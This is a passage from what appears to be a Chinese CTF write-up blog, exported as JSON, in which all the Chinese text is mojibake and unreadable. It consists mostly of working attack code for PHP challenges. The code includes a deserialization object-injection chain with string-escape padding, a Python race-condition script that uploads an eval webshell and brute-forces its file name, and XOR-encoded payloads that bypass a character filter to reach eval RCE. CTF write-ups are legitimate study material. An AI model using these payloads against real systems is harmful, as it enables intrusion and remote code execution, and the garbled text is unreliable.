ä»¶äº‹ï¼Œé¦–å…ˆï¼Œidresultå¯¹åº”çš„æ˜¯æŸ¥è¯¢å‡ºæ¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æŸ¥è¯¢è¯­å¥åº”è¯¥æ˜¯select password,id from users where username=ï¼Ÿ å…¶æ¬¡ æŸ¥è¯¢çš„å¯¹è±¡ä¹Ÿå°±æ˜¯nameçš„èµ‹å€¼éœ€è¦åœ¨è¿™é‡Œèµ‹å€¼: æ‰€ä»¥æ”¹è‰¯ä»¥åçš„pocä¸º: &lt;?phperror_reporting(0);session_start();function safe($parm){ $array= array('union','regexp','load','into','flag','file','insert',&quot;'&quot;,'\\\\',&quot;*&quot;,&quot;alter&quot;); return str_replace($array,'hacker',$parm);}class User{ public $id; public $age=null; public $nickname=null; public function login() { } public function update(){ } public function getNewInfo(){ } public function __destruct(){ } public function __toString() { $this-&gt;nickname-&gt;update($this-&gt;age); return &quot;0-0&quot;; }}class Info{ public $CtrlCase; public function __construct(){ } public function __call($name,$argument){ echo $this-&gt;CtrlCase-&gt;login($argument[0]); }}Class UpdateHelper{ public $sql; public function __construct(){ } public function __destruct() { echo $this-&gt;sql; }}class dbCtrl{ public $hostname=&quot;localhost&quot;; public $dbuser=&quot;root&quot;; public $dbpass=&quot;as119801222&quot;; public $database=&quot;security&quot;; public $name; public $password; public $mysqli; public $token; public function __construct() { $this-&gt;name=$_POST['username']; $this-&gt;password=$_POST['password']; $this-&gt;token=$_SESSION['token']; } public function login($sql) { $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) { die(&quot;è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:&quot; . $this-&gt;mysqli-&gt;connect_error); } $result=$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param('s', $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token=='admin') { return $idResult; } if (!$idResult) { echo('ç”¨æˆ·ä¸å­˜åœ¨!'); return false; } if (md5($this-&gt;password)!==$passwordResult) { echo('å¯†ç é”™è¯¯ï¼'); return false; } $_SESSION['token']=$this-&gt;name; return $idResult; } public function update($sql) { //è¿˜æ²¡æ¥å¾—åŠå†™ }}$a=new UpdateHelper();$b=new User();$c=new Info();$d=new dbCtrl();$d-&gt;token='admin';$d-&gt;name='admin';$b-&gt;age=&quot;select password,id from users where username=?&quot;;$c-&gt;CtrlCase=$d;$b-&gt;nickname=$c;$a-&gt;sql=$b;#echo (serialize($a));unserialize(&quot;O:12:\\&quot;UpdateHelper\\&quot;:1:{s:3:\\&quot;sql\\&quot;;O:4:\\&quot;User\\&quot;:3:{s:2:\\&quot;id\\&quot;;N;s:3:\\&quot;age\\&quot;;s:52:\\&quot;select password,id from users where username='admin'\\&quot;;s:8:\\&quot;nickname\\&quot;;O:4:\\&quot;Info\\&quot;:1:{s:8:\\&quot;CtrlCase\\&quot;;O:6:\\&quot;dbCtrl\\&quot;:8:{s:8:\\&quot;hostname\\&quot;;s:9:\\&quot;localhost\\&quot;;s:6:\\&quot;dbuser\\&quot;;s:4:\\&quot;root\\&quot;;s:6:\\&quot;dbpass\\&quot;;s:11:\\&quot;as119801222\\&quot;;s:8:\\&quot;database\\&quot;;s:8:\\&quot;security\\&quot;;s:4:\\&quot;name\\&quot;;s:5:\\&quot;admin\\&quot;;s:8:\\&quot;password\\&quot;;N;s:6:\\&quot;mysqli\\&quot;;N;s:5:\\&quot;token\\&quot;;s:5:\\&quot;admin\\&quot;;}}}}&quot;); ç”±äºä»¥ä¸Šçš„pocæˆ‘è¿æ¥çš„æ˜¯æœ¬åœ°çš„æ•°æ®åº“æ¥æµ‹è¯•ï¼Œæ‰€ä»¥åé¢éœ€è¦æ”¹å›å»æ¥ä¸‹æ¥å°±æ˜¯è®©è¿™é‡Œçš„ååºåˆ—åŒ–å†…å®¹é€ƒé€¸å‡ºå»è¿™é‡Œè¯´ä¸€ä¸‹é‡åˆ°çš„å‘ï¼š1.è®°å¾—å‰é¢çš„å†…å®¹è¦æœ‰å¼•å·é—­åˆï¼Œåé¢è¦æœ‰èŠ±æ‹¬å·é—­åˆ2.åŸæœ¬çš„ååºåˆ—åŒ–å†…å®¹è¿˜æœ‰ä¸ªCtrlCaseï¼Œæˆ‘ä»¬çš„payloadæ‹¼æ¥è¿›å»ä»¥åä¼šè¢«æŒ¤åˆ°åé¢å»å°±è¢«ä¸¢æ‰äº†ï¼Œæ‰€ä»¥éœ€è¦åœ¨æˆ‘ä»¬çš„payloadä¹‹å‰åŠ ä¸€ä¸‹ï¼ˆåœ¨è¿™é‡Œå¡äº†å¾ˆä¹…æ— è¯­äº†ï¼‰ è¿™æ˜¯ç»ˆæpayloadï¼š &lt;?phperror_reporting(0);session_start();function safe($parm){ $array= array('union','regexp','load','into','flag','file','insert',&quot;'&quot;,'\\\\',&quot;*&quot;,&quot;alter&quot;); return str_replace($array,'hacker',$parm);}class User{ public $id; public $age=null; public $nickname=null; public function login() { } public function update(){ } public function getNewInfo(){ $age=&quot;loadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadload\\&quot;;O:12:\\\\\\&quot;UpdateHelper\\\\\\&quot;:1:{s:3:\\\\\\&quot;sql\\\\\\&quot;;O:4:\\\\\\&quot;User\\\\\\&quot;:3:{s:2:\\\\\\&quot;id\\\\\\&quot;;N;s:3:\\\\\\&quot;age\\\\\\&quot;;s:52:\\\\\\&quot;select password,id from users where username = 'admin'\\\\\\&quot;;s:8:\\\\\\&quot;nickname\\\\\\&quot;;O:4:\\\\\\&quot;Info\\\\\\&quot;:1:{s:8:\\\\\\&quot;CtrlCase\\\\\\&quot;;O:6:\\\\\\&quot;dbCtrl\\\\\\&quot;:8:{s:8:\\\\\\&quot;hostname\\\\\\&quot;;s:9:\\\\\\&quot;localhost\\\\\\&quot;;s:6:\\\\\\&quot;dbuser\\\\\\&quot;;s:4:\\\\\\&quot;root\\\\\\&quot;;s:6:\\\\\\&quot;dbpass\\\\\\&quot;;s:11:\\\\\\&quot;as119801222\\\\\\&quot;;s:8:\\\\\\&quot;database\\\\\\&quot;;s:8:\\\\\\&quot;security\\\\\\&quot;;s:4:\\\\\\&quot;name\\\\\\&quot;;s:5:\\\\\\&quot;admin\\\\\\&quot;;s:8:\\\\\\&quot;password\\\\\\&quot;;N;s:6:\\\\\\&quot;mysqli\\\\\\&quot;;N;s:5:\\\\\\&quot;token\\\\\\&quot;;s:5:\\\\\\&quot;admin\\\\\\&quot;;}}}}&quot;; $nickname=&quot;11&quot;; return safe(serialize(new Info($age,$nickname))); } public function __destruct(){ } public function __toString() { $this-&gt;nickname-&gt;update($this-&gt;age); return &quot;0-0&quot;; }}class Info{ public $age; public $CtrlCase; public function __construct(){// $this-&gt;age=$age;// $this-&gt;nickname=$nickname; } public function __call($name,$argument){ echo $this-&gt;CtrlCase-&gt;login($argument[0]); }}Class UpdateHelper{ public $sql; public function __construct(){ } public function __destruct() { echo $this-&gt;sql; }}class dbCtrl{ public $hostname=&quot;127.0.0.1&quot;; public $dbuser=&quot;root&quot;; public $dbpass=&quot;root&quot;; public $database=&quot;test&quot;; public $name; public $password; public $mysqli; public $token; public function __construct() { $this-&gt;name=$_POST['username']; $this-&gt;password=$_POST['password']; $this-&gt;token=$_SESSION['token']; } public function login($sql) { $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) { die(&quot;è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:&quot; . $this-&gt;mysqli-&gt;connect_error); } $result=$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param('s', $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token=='admin') { return $idResult; } if (!$idResult) { echo('ç”¨æˆ·ä¸å­˜åœ¨!'); return false; } if (md5($this-&gt;password)!==$passwordResult) { echo('å¯†ç é”™è¯¯ï¼'); return false; } $_SESSION['token']=$this-&gt;name; return $idResult; } public function update($sql) { //è¿˜æ²¡æ¥å¾—åŠå†™ }}$a=new UpdateHelper();$b=new User();$c=new Info();$d=new dbCtrl();$d-&gt;token='admin';$d-&gt;name='admin';$b-&gt;age=&quot;select password,id from users where username=?&quot;;$c-&gt;CtrlCase=$d;$b-&gt;nickname=$c;$a-&gt;sql=$b;echo (&quot;loadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadload\\&quot;;s:8:\\&quot;CtrlCase\\&quot;;&quot;);echo (serialize($a)); åœ¨æœ¬åœ°è°ƒè¯•æ˜¯å¯ä»¥çš„==ä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥æ”¾åˆ°é¢˜ç›®ä¸‹å°±ä¸è¡Œäº†ï¼Œæˆ‘äººå‚»äº† å¯ä»¥çœ‹åˆ°å› ä¸ºæ•°æ®åº“çš„è´¦å·å¯†ç ä¸åŒ¹é…æ‰€ä»¥è¿”å›äº†é”™è¯¯ä¿¡æ¯ã€‚ æˆ‘ä»¥ä¸ºæ˜¯æˆ‘çš„payloadå‡ºäº†é—®é¢˜ï¼Œä½†æ˜¯ç›´æ¥å¤åˆ¶ç²˜è´´åˆ«äººçš„ä¹Ÿæ²¡æœ‰å¯ä»¥çš„â€“æ— è¯­äº† loadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadload&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:{s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:{s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:46:&quot;select password,id from users where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:{s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:{s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}}}}} åæ¥æ„Ÿè§‰è¿˜æ˜¯å¾ˆä¸ç”˜å¿ƒï¼Œäºæ˜¯åˆå»æ‰¾äº†ä¸€ä¸‹å…¶ä»–äººçš„payloadï¼Œå‘ç°æœ‰ä¸€ä¸ªäººçš„å¯ä»¥ç”¨ï¼Œå¯æ˜¯s:2:â€asâ€;è¿™ä¸ªéƒ¨åˆ†ä»å“ªé‡Œæ¥çš„å±å®æ²¡æ‡‚æ‰¾äº†å¥½å‡ ä¸ªå¸ˆå‚…çš„é¢˜è§£éƒ½æ²¡çœ‹åˆ° loadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadload&quot;;s:2:&quot;as&quot;;O:12:&quot;UpdateHelper&quot;:1:{s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:{s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:46:&quot;select password,id from users where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:{s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:{s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}}}}} è€Œä¸”åœ¨æœ¬åœ°è¿è¡Œçš„æ—¶å€™å°±è¿è¡Œä¸æ¥ï¼Œç›²çŒœæ˜¯é¢˜ç›®æ²¡é…ç½®å¥½å§ï¼Ÿè¶Šæƒ³è¶Šä¸åˆç†ï¼Œåˆé‡æ–°å°è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°æˆ‘é‚£ä¸ªåˆå¯ä»¥äº†ï¼Œä½†æ˜¯æœ¬åœ°å´ä¸è¡Œäº†,äºæ˜¯å†å°è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°äºŒè€…ä¹‹é—´ç›¸å·®ä¸¤ä¸ªå­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯æœ¬åœ°èƒ½æˆåŠŸçš„ï¼Œåªè¦æ‹¿æ‰ä¸€ä¸ªloadï¼Œä¹Ÿå°±æ˜¯æ‰£æ‰ä¸¤ä¸ªå­—ç¬¦åœ¨é¢˜ç›®ç¯å¢ƒä¸‹å°±èƒ½æˆåŠŸã€‚è€Œä¸”å¾ˆæ— è¯­çš„æ˜¯æ‰£æ‰ä¸¤ä¸ªèŠ±æ‹¬å·ä¹Ÿèƒ½æˆåŠŸ==ï¼Œæ— è¯­äº† å°ç»“å®Œæ•´åšä¸‹æ¥ä»¥åè¿˜æ˜¯æ”¶è·äº†å¾ˆå¤šï¼Œä¸»è¦æ˜¯æœ‰å¾ˆå¤šå°å‘ï¼Œå½“ä»£ç è¯»å®Œä¸€éå¼ï¼Œååºåˆ—popé“¾çš„æ„é€ å…¶å®å¹¶æ²¡æœ‰å¾ˆå›°éš¾ï¼Œå°±æ˜¯é‚£å‡ ä¸ªé­”æœ¯æ–¹æ³•è¿ç”¨ä¸€ä¸‹å°±å‹ï¼Œé¡ºç€æ€è·¯èµ°å°±è¡Œã€‚å‘ç‚¹ä¸»è¦å°±æ˜¯ä¸Šé¢é‚£å‡ ä¸ªï¼Œè¯´è¯´å­¦åˆ°äº†å•¥1.å­¦åˆ°äº†å¾ˆå¤šè°ƒè¯•æ–¹æ¡ˆï¼Œå½“æˆ‘æ‹¼æ¥ä»¥åä¸€ç›´å°è¯•ä¸å‡ºæ¥çš„æ—¶å€™ï¼Œå¯¹é‚£ä¸²ååºåˆ—åŒ–ä¸€ä¸ªéƒ¨åˆ†ä¸€ä¸ªéƒ¨åˆ†è¿›è¡Œè°ƒè¯•ï¼Œæ‰å‘ç°éœ€è¦ä¿è¯å…¶å®Œæ•´æ€§2.é‚£ä¸ªsä»å“ªé‡Œæ¥çš„çœŸçš„æŠŠæˆ‘ææ‡µäº†==ç”¨é¢˜ç›®ä¸‹ä¸‹æ¥çš„æºç å»è·‘è¿™ä¸ªpayloadæ˜¯å‡ºä¸æ¥ä¸œè¥¿çš„ï¼Œç”¨åŸæœ¬çš„æ‰è¡Œï¼Œè€Œåœ¨é¢˜ç›®çš„ç¯å¢ƒä¸­å´åˆå¿…é¡»è¦ç”¨é‚£ä¸ªç©æ„ï¼Ÿï¼Ÿ https://www.1ight.top/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%94%bb%e5%87%bb/#comment-9","link":"/2021/07/18/GYCTF2020-Easyphp/"},{"title":"buu23","text":"[RoarCTF 2019]Simple Uploadå¼€å¤´æºç  &lt;?phpnamespace Home\\Controller;use Think\\Controller;class IndexController extends Controller{ public function index() { show_source(__FILE__); } public function upload() { $uploadFile = $_FILES['file'] ; if (strstr(strtolower($uploadFile['name']), &quot;.php&quot;) ) { return false; } $upload = new \\Think\\Upload();// å®ä¾‹åŒ–ä¸Šä¼ ç±» $upload-&gt;maxSize = 4096 ;// è®¾ç½®é™„ä»¶ä¸Šä¼ å¤§å° $upload-&gt;allowExts = array('jpg', 'gif', 'png', 'jpeg');// è®¾ç½®é™„ä»¶ä¸Šä¼ ç±»å‹ $upload-&gt;rootPath = './Public/Uploads/';// è®¾ç½®é™„ä»¶ä¸Šä¼ ç›®å½• $upload-&gt;savePath = '';// è®¾ç½®é™„ä»¶ä¸Šä¼ å­ç›®å½• $info = $upload-&gt;upload() ; if(!$info) {// ä¸Šä¼ é”™è¯¯æç¤ºé”™è¯¯ä¿¡æ¯ $this-&gt;error($upload-&gt;getError()); return; }else{// ä¸Šä¼ æˆåŠŸ è·å–ä¸Šä¼ æ–‡ä»¶ä¿¡æ¯ $url = __ROOT__.substr($upload-&gt;rootPath,1).$info['file']['savepath'].$info['file']['savename'] ; echo json_encode(array(&quot;url&quot;=&gt;$url,&quot;success&quot;=&gt;1)); } }} å°è¯•äº†ä¸€ä¸‹å…¶ä»–åç¼€åä¸Šä¼ ï¼Œå‘ç°æ— æ³•è¢«è§£ææˆåŠŸï¼Œæ‰€ä»¥çœ‹åˆ°è¿™ä¸ªupload()å‡½æ•°ï¼Œä»¥åŠå¯¹åº”çš„é˜²æŠ¤æœºåˆ¶ï¼ŒçŒœæµ‹å¯ä»¥ä½¿ç”¨æ¡ä»¶ç«äº‰ç»•è¿‡ï¼Œå†™å…ˆä¸€ä¸‹è„šæœ¬ thinkphpé»˜è®¤ä¸Šä¼ è·¯å¾„ä¸ºï¼š/home/index/uploadæ‰€ä»¥æœ‰ import requestsurl=&quot;http://5ff85f06-6397-4b0b-9dc6-362da72c71bb.node4.buuoj.cn/index.php/home/index/upload&quot;s=requests.session()files={'file':(&quot;1.txt&quot;,&quot;&quot;)}files1={'file':(&quot;1.php&quot;,&quot;&lt;?php eval($_GET['a']); ?&gt;)&quot;)}r=s.post(url,files=files).textprint(r)r=s.post(url,files=files1).textprint(r)r=s.post(url,files=files).textprint(r) {&quot;url&quot;:&quot;\\/Public\\/Uploads\\/2021-07-24\\/60fbd50e4d0f4.txt&quot;,&quot;success&quot;:1}{&quot;url&quot;:&quot;\\/Public\\/Uploads\\/&quot;,&quot;success&quot;:1}{&quot;url&quot;:&quot;\\/Public\\/Uploads\\/2021-07-24\\/60fbd50e61127.txt&quot;,&quot;success&quot;:1} æ¥ä¸‹æ¥å°±æ˜¯å»çˆ†ç ´ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶å 60fbd50e6112760fbd50e4d0f4 import requestsurl=&quot;http://5ff85f06-6397-4b0b-9dc6-362da72c71bb.node4.buuoj.cn/Public/Uploads/2021-07-24/&quot;# files={'file':(&quot;1.txt&quot;,&quot;&quot;)}# files1={'file[]':(&quot;1.php&quot;,&quot;&lt;?php eval($_GET['a']); ?&gt;)&quot;)}# r=s.post(url,files=files).text# print(r)# r=s.post(url,files=files1).text# print(r)# r=s.post(url,files=files).text# print(r)str='0123456789abcdef'for i in str: for j in str: for f in str: for k in str: for o in str: url_fina=url+f&quot;60fbd50e{i}{j}{f}{k}{o}.php&quot; try: r=requests.get(url,timeout=1) except: continue if r.status_code!=404: print(url_fina) break ä½†æ˜¯ç°åœ¨buuçš„é˜²æ­¢å¤ªå¤šè¯·æ±‚å¤ªä¸¥äº†â€“ä¸€ç›´è·‘ä¸å‡ºæ¥ [HarekazeCTF2019]Avatar Uploader 1å¿˜ä¿å­˜äº†ï¼Œæ²¡äº†å¾ˆéš¾å—ï¼Œå¤§æ¦‚å°±æ˜¯ç…§ä¸€å¼ 256åƒç´ ä¸€ä¸‹çš„å›¾ç‰‡ï¼Œç„¶åå°†å›¾ç‰‡å†…å®¹æ”¹ä¸ºè¿™ä¸€è¡Œå› ä¸ºé‚£ä¸¤ä¸ªè§£æå‡½æ•°çš„è§£ææ–¹å¼åœ¨è¿™é‡Œä¸åŒ [ISITDTU 2019]EasyPHP&lt;?phphighlight_file(__FILE__);$_ = @$_GET['_'];if ( preg_match('/[\\x00- 0-9\\'&quot;`$&amp;.,|[{_defgops\\x7F]+/i', $_) ) die('rosÃ© will not do it');if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd ) die('you are so close, omg');eval($_);?&gt; æ­£åˆ™è¿›è¡ŒåŒ¹é…è¿‡æ»¤ï¼ŒåŒ¹é…00åˆ°ç©ºæ ¼()çš„å­—ç¬¦ï¼Œ0åˆ°9çš„æ•°å­—ã€&quot;$&amp;.,|[{_defgopsä»¥åŠDELï¼ˆ7fï¼‰å­—ç¬¦ã€‚å¦‚æœä½ æäº¤çš„å­—ç¬¦ä¸²å‡ºç°ä¸Šè¿°å­—ç¬¦ï¼Œdieã€‚ç¬¬äºŒä¸ªifè¡¨ç¤ºæˆ‘ä»¬æäº¤çš„å­—ç¬¦ä¸²ä¸€å…±ä¸èƒ½å‡ºç°å¤šäº13ç§ä¸åŒçš„å­—ç¬¦ä½¿ç”¨æ­¤ç½‘ç«™å¯ä»¥è¿›è¡Œæ­£åˆ™åŒ¹é…çš„è°ƒè¯•https://regex101.com/æ‰€ä»¥å®ƒå…è®¸å‡ºç°çš„å­—ç¬¦å¯ä»¥å¦‚ä¸‹ !#%()*+-/:;&lt;=&gt;?@ABCHIJKLMNQRTUVWXYZ\\]^abchijklmnqrtuvwxyz}~ æˆ‘ä»¬åé¢çš„evalè‚¯å®šæ˜¯è¦æ‰§è¡Œå‡½æ•°çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥fuzzä¸€ä¸‹å“ªäº›å‡½æ•°æ²¡è¢«è¿‡æ»¤ï¼Œä»è€Œæ¥çœ‹çœ‹æœ‰æ²¡æœ‰å®ç°rceçš„å¯èƒ½,ç”¨phpå†™ä¸ªè„šæœ¬ &lt;?php$array=get_defined_functions();foreach($array['internal'] as $arr){ if(preg_match('/[\\x00- 0-9\\'&quot;\\`$&amp;.,|[{_defgops\\x7F]+/i',$arr))continue; if(strlen(count_chars(strtolower($arr),0x3))&gt;0xd)continue; var_dump($arr.'&lt;br/&gt;')} ä½†æ˜¯å¾—åˆ°çš„å‡½æ•°å´å’Œè¯»å–æ–‡ä»¶å•¥çš„æ²¡æœ‰å…³ç³»â€“ï¼Œæ‰€ä»¥ç»§ç»­å¾€ä¸‹çœ‹çœ‹å…¶å®ä»¥å‰ä¹Ÿåšè¿‡å¾ˆå¤šè¿™ç§ç±»ä¼¼é¢˜ç‰¹å¾æ˜¯1.è¿‡æ»¤äº†å¾ˆå¤šå­—ç¬¦2.æœ‰äº›è¿ç®—å­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤é‚£ä¹ˆè¿™å°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿ç®—æ¥å–å­—ç¬¦ï¼Œæ¯”å¦‚è¯´^è¿ç®—ç„¶åå»æ„é€ æˆ‘ä»¬éœ€è¦çš„å­—ç¬¦payloadtest: (%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff)();//åˆ†å·å’Œæ‹¬å·æ˜¯å› ä¸ºè¿™ä¸ªè¦æ”¾åˆ°evalé‡Œé¢æ‰§è¡Œï¼Œæ˜¯å¿…ä¸å¯å°‘çš„è¯­æ³•è¦æ±‚ æ¥ä¸‹æ¥çœ‹çœ‹è¿™ä¸ªé…ç½®é‡Œé¢æœ‰ä»€ä¹ˆèƒ½ç”¨çš„ä¿¡æ¯ä¸é¦–å…ˆdisable_functionä¸­çš„å‡½æ•°æœ‰å¾ˆå¤šéƒ½è¢«ç¦äº†ï¼Œç„¶åå®ƒå¯ä»¥è®¿é—®çš„ç›®å½•ä¹Ÿåªé™åˆ¶åœ¨/htmlç›®å½•ä¸‹ï¼Œé‚£ä¹ˆæ ¹æ®ä»¥å¾€çš„ç»éªŒï¼Œå¤§æ¦‚æ˜¯è¦scandirç­‰å‡½æ•°çœ‹ä¸€ä¸‹å½“å‰ç›®å½•ä¸‹çš„å†…å®¹äº†æˆ‘ä»¬æ„é€ ä¸€ä¸‹è¯­å¥ç„¶åå»æ‰¾ä¸€ä¸‹å­—ç¬¦ print_r(scandir('.')); è¿˜æ˜¯ä¹‹å‰çš„é‚£ä¸ªè„šæœ¬ import urllib.parsefind = ['p','r','i','_','n','t','s','c','a','d','r','.']for i in range(0,256): for j in range(0,256): result=chr(i^j) if(result in find): a= i.to_bytes(1,byteorder='little') b= j.to_bytes(1,byteorder='little') #print(a,b) a= urllib.parse.quote(a) b= urllib.parse.quote(b) print(&quot;%s:%s^%s&quot;%(result,a,b)) ä½†æ˜¯è¿™æ ·è¿ç®—å‡ºæ¥çš„å­—ç¬¦æˆ‘ä»¬éšä¾¿é€‰å–å°±ä¼šå¤§äºåä¸‰ä¸ªäº†ï¼Œè¦ç»•è¿‡è¿™ä¸ªï¼Œæˆ‘ä»¬å°±è¦æƒ³æƒ³çœ‹å¦‚ä½•ç¼©å‡ï¼Ÿ ((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)); å…¶å®è¿ç”¨ä¸€ç§å¥—å¨ƒçš„æ€æƒ³å³å¯ï¼Œè¿™äº›å­—ç¬¦é‡Œé¢çš„å­—ç¬¦è‚¯å®šå¯ä»¥ç”±å…¶ä»–å­—ç¬¦å†å¼‚æˆ–æ„æˆçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œå°±å°†æ‰€æœ‰å¼‚æˆ–å­—ç¬¦å…ˆåˆ—å‡ºï¼Œæƒ³åœ¨ä¸Šé¢çš„ä»£ç è¿›è¡Œæ”¹ç¼–ä¸€ä¸‹ï¼Œç›´æ¥ä¸€æ­¥åˆ°ä½ä½†æ˜¯æˆ‘å‘ç°ä¼¼ä¹ä¸å¤ªè¡Œã€‚è¿˜ä¸å¦‚æˆ‘ç›´æ¥å–å®Œå†é€è¿›å»å¯¹æ¯ä¸ªå­—ç¬¦é‡æ–°å¼‚æˆ– result2 = [0x8b, 0x9b, 0xa0, 0x9c, 0x8f, 0x91, 0x9e, 0xd1, 0x96, 0x8d, 0x8c] # Original chars,11 totalresult = [0x9b, 0xa0, 0x9c, 0x8f, 0x9e, 0xd1, 0x96, 0x8c] # to be deletedtemp = []for d in result2: for a in result: for b in result: for c in result: if (a ^ b ^ c == d): if a == b == c == d: continue else: print(&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot; % (a, b, c, d)) if d not in temp: temp.append(d)print(len(temp), temp) å¯¹ç»“æœè¿›è¡Œæ•´ç†ä¸€ä¸‹ï¼Œå‘ç°ï¼š ((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)); 